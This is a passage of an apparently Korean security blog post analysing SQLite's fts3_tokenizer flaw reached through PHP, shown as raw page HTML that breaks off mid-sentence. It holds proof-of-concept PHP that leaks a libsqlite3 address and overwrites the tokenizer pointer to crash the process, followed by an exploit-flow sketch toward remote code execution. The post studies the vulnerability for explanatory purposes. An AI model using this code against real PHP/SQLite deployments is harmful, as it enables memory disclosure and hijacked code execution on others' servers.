class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>취약한 부분의 쿼리를 PHP 코드로 작성하여 쿼리를 수행하여 메모리 릭을 진행합시다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 502px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAd0lEQVQI123KzQ6CMBhE0Q80xo2KSilQSgui/AiuXPj+L3aNNe5cTCaTOZKcHFU9Yd0dY0dqP3NWDbq44pqFLO/ITY/SXdhp1gZr/Rxsqi8Upqe0IxLtkbIamJZXOH37CH0bnmy2CpEd0SpB4sMXf/pPfiZeH3kDitwye+jIRWAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/ece3868599479ae40e51537c45dfb6e1/eea79/6.png\"\n        srcset=\"/static/ece3868599479ae40e51537c45dfb6e1/e9ff0/6.png 180w,\n/static/ece3868599479ae40e51537c45dfb6e1/f21e7/6.png 360w,\n/static/ece3868599479ae40e51537c45dfb6e1/eea79/6.png 502w\"\n        sizes=\"(max-width: 502px) 100vw, 502px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>그렇다면, 해당 부분은 왜 메모리 릭이 가능하지 살펴봅시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\">/* Load the built-in tokenizers into the hash table */</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">==</span><span class=\"token constant\">SQLITE_OK</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"simple\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pSimple<span class=\"token punctuation\">)</span>\n     <span class=\"token operator\">||</span> <span class=\"token class-name\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"porter\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pPorter<span class=\"token punctuation\">)</span> \n     <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>pIcu <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">sqlite3Fts3HashInsert</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"icu\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pIcu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      rc <span class=\"token operator\">=</span> <span class=\"token constant\">SQLITE_NOMEM</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> sqlite3_tokenizer_module simpleTokenizerModule <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n simpleCreate<span class=\"token punctuation\">,</span>\n simpleDestroy<span class=\"token punctuation\">,</span>\n simpleOpen<span class=\"token punctuation\">,</span>\n simpleClose<span class=\"token punctuation\">,</span>\n simpleNext<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">built-in tokenizer</code> 는 hash-table에 로드되며 해당 주소는 libsqlite3 의 .bss 섹션을 참조되고 있습니다.</li>\n</ul>\n<h3 id=\"sqlite-fts3_tokenizer-fts3_tokenizer\" style=\"position:relative;\"><a href=\"#sqlite-fts3_tokenizer-fts3_tokenizer\" aria-label=\"sqlite fts3_tokenizer fts3_tokenizer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3_tokenizer(), fts3_tokenizer()</h3>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token constant\">SELECT</span> <span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>tokenizer<span class=\"token operator\">-</span>name<span class=\"token operator\">></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token constant\">SELECT</span> <span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>tokenizer<span class=\"token operator\">-</span>name<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;</span>sqlite3_tokenizer_module ptr<span class=\"token operator\">></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>하나의 인수, 두 개의 인수로 fts3_tokenizer 함수를 호출할 수 있습니다. 첫 번째 인자는 해당 함수에서 <code class=\"language-text\">tokenizer</code>를 식별하는 문자열이며 <code class=\"language-text\">slqite3_tokenizer_module</code> 구조체에 대한 포인터입니다.</li>\n<li>즉, 하나의 인수가 전달되면 현재 등록된 tokenizer 구현에 대한 포인터가 반환되고 두 번째 인수는 tokenizer를 등록할 사본이 반환되어 집니다.</li>\n</ul>\n<h2 id=\"fts3-callback을-통한-임의의-코드-실행-취약점\" style=\"position:relative;\"><a href=\"#fts3-callback%EC%9D%84-%ED%86%B5%ED%95%9C-%EC%9E%84%EC%9D%98%EC%9D%98-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"fts3 callback을 통한 임의의 코드 실행 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 callback을 통한 임의의 코드 실행 취약점</h2>\n<ul>\n<li>앞서 취약한 부분의 쿼리인 <code class=\"language-text\">fts3_tokenizer</code> 두 번째 인자에 임의의 값을 입력한 경우 크래쉬가 발생한 것을 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">getmypid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1212</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ob_end_flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">-=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select fts3_tokenizer('simple', x'4141414141414141');\n        create virtual table a using fts3(tokenizer=simple);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span>\n</code></pre></div>\n<ul>\n<li>크래쉬가 발생한 부분을 분석해보면 <code class=\"language-text\">rbp</code> 레지스터 값이 <code class=\"language-text\">fts3_tokenizer</code> 두 번째 파라미터인 것을 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 68.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACH0lEQVQ4y5WTe3OaUBDFb9SoURAEAXnJQyHg+xk1PpMYTaYzneb7f5jTudsmjTNJ0/6xc2GA356ze2Cu18FossNydYTf7OMiK0NWGqjpISw3hVR16fqqbNCzTK7612KiZGO+PODu8B3D8RaXhRpsN4UX9KhJ0BqgIjvIXir/BiyLJkaTLW7XJ6SdG/rQMGPo9RZ6gxXC1hAlwQS7qNAHX0GZKDkEO5xeMJntSWHQHJDKTm9Jlr9SdQbk3QejNea3j4iTKQEtJ4FmtCBULDAm/h/wTeHxBcPxhoB+2CdgWeTAMtmlykhnxe2/1huQqxiMNlisjkg7c+TyKkwnIXVOo01gpRZA1QJqkC9qKJZ0Oj9UyDfIt/nw+IOW8GqZw9bbZ4yne1JuOSkBOZg34dH61PJ4usNq84Tu4JaAdSsmIM+naV+j4XdpUbRtPgIm0gg+tMxzOJvfY7v/RlvlQNNOCMoVzuYPaHcXuFkcaLZ8FLw+XQqPBQfu7n4B+Qw9vwvHTckq/5OEik3x4c0F0UKxZPzJJQe9V3glmBjP9lhunhC3Z8jmVWj1CLoZoTdao91bwrBiMCYgV6hBUhqo1gLIqgdGoPOgs8iOsZ7ucNo9Y5hMUMkrCK0IgRXRfeQmMKsu1LIBTTRRlx0qU3ZQyau/oe+Am/YUfb+DSPMRKg0YBZVOv+rAk2yEagO+7CDSAzRrHr3X0nxc6wGskgaWOQf+BFo6ZHwLayVXAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"php_in.png\"\n        title=\"php_in.png\"\n        src=\"/static/895cf1cf65041b4a6f0abd6f963b6726/37523/php_in.png\"\n        srcset=\"/static/895cf1cf65041b4a6f0abd6f963b6726/e9ff0/php_in.png 180w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/f21e7/php_in.png 360w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/37523/php_in.png 720w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/1cfc2/php_in.png 900w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>SQLite3가 <code class=\"language-text\">xCreate</code> callback function pointer를 호출하였고 이에 대한 Callback 호출에 대한 임계값 검증이 존재하지 않았기 때문에 발생하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://github.com/mackyle/sqlite/blob/0ab6f6f4c9142a55959ed2097734942c1781b538/ext/fts3/fts3_tokenizer.c</span>\nm <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_module <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">sqlite3Fts3HashFind</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>m <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">sqlite3Fts3ErrMsg</span><span class=\"token punctuation\">(</span>pzErr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"unknown tokenizer: %s\"</span><span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    rc <span class=\"token operator\">=</span> SQLITE_ERROR<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">}</span>\n    rc <span class=\"token operator\">=</span> m<span class=\"token operator\">-></span><span class=\"token function\">xCreate</span><span class=\"token punctuation\">(</span>iArg<span class=\"token punctuation\">,</span> aArg<span class=\"token punctuation\">,</span> ppTok<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">!=</span>SQLITE_OK <span class=\"token operator\">||</span> <span class=\"token operator\">*</span>ppTok <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">!=</span>SQLITE_OK <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      <span class=\"token function\">sqlite3Fts3ErrMsg</span><span class=\"token punctuation\">(</span>pzErr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"unknown tokenizer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n      <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>ppTok<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>pModule <span class=\"token operator\">=</span> m<span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">sqlite3_free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>aArg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span></code></pre></div>\n<h2 id=\"xopen-취약점\" style=\"position:relative;\"><a href=\"#xopen-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"xopen 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>xOpen 취약점</h2>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> exploit <span class=\"token keyword\">values</span><span class=\"token punctuation\">(</span>x<span class=\"token string\">\"9090909090909090\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>현 쿼리의 “exploit” 테이블은 앞에서 create 쿼리문으로 생성이 된후 insert 쿼리문을 이용해서 데이터를 삽입할 경우 <code class=\"language-text\">xOpen</code> Callback function pointer가 수행됩니다.</li>\n<li><code class=\"language-text\">xOpen</code> 은 값 으로 0x9090909090909090 16진수를 <code class=\"language-text\">pInput1</code> 매개 변수로 사용하여 CallBack 과 같이 트리거 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://github.com/mackyle/sqlite/blob/0ab6f6f4c9142a55959ed2097734942c1781b538/ext/fts3/fts3_expr.c</span>\nsqlite3_tokenizer_module <span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>pModule <span class=\"token operator\">=</span> pTokenizer<span class=\"token operator\">-></span>pModule<span class=\"token punctuation\">;</span>\nsqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCsr <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">int</span> rc<span class=\"token punctuation\">;</span>\nrc <span class=\"token operator\">=</span> pModule<span class=\"token operator\">-></span><span class=\"token function\">xOpen</span><span class=\"token punctuation\">(</span>pTokenizer<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pCsr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>이를 이용해서 예측이 가능한 메모리 위치에 대상 주소를 만들고 메모리 주소에 있어 <code class=\"language-text\">fts3_tokenizer</code> 의 Callback 을 트리거하여 다음 프로그램 카운터를 조작해 원하는 파라미터 값을 컨트롤해 공격 연계가 가능합니다.</li>\n</ul>\n<h1 id=\"fts3-php-rce-exploitation\" style=\"position:relative;\"><a href=\"#fts3-php-rce-exploitation\" aria-label=\"fts3 php rce exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 PHP RCE Exploitation</h1>\n<h2 id=\"exploit-공격-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 공격 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 공격 흐름도</h2>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\">$sqlite3_lib_leaked_tokenizer <span class=\"token operator\">=</span> sqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"select hex(fts3_tokenizer('simple')) addr\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n$libsqlite3_addr <span class=\"token operator\">=</span> flip<span class=\"token punctuation\">(</span>$sqlite3_lib_leaked_tokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$libsqlite3_base <span class=\"token operator\">=</span> $libsqlite3_addr <span class=\"token operator\">-</span> $leaked_simple_tokenizer_offset<span class=\"token punctuation\">;</span>\n\n$payload <span class=\"token operator\">=</span> <span class=\"token number\">0x9090909090909090</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// payload </span>\nsqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"select fts3_tokenizer('simple', ?);\"</span><span class=\"token punctuation\">,</span> $payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nsqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"create table a using fts3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// crash</span></code></pre></div>\n<ul>\n<li>다음과 같은 형태로 취약점 Exploit 흐름이 진행되어 집니다.</li>\n<li>x86 환경에서의 취약점은 <code class=\"language-text\">xCreate</code> 의 Callback 트리거 만으로 Exploit 진행이 어렵다고 판단하여 <code class=\"language-text\">xOpen</code> 의 인자 트리거를 통해 